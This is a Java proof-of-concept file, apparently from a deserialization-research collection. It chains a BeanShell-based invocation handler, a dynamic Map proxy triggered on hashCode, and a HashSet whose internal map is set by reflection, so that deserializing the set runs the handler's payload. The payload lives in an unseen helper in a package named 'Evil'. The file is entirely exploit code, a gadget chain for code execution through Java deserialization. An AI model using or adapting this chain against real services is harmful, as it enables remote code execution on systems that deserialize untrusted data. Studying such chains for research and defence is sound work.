package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class POC_12 {

    /***
     * Hashset, similar to HashMap
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("hashCode");
        Map m = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class<?>[]{Map.class}, handler);

        HashMap map = ReflectionUtil.makeMap(m);
        HashSet set = new HashSet<>();
        ReflectionUtil.setField(set, "map", map);

        SerializeUtil.deserialize(SerializeUtil.serialize(set));
    }

}
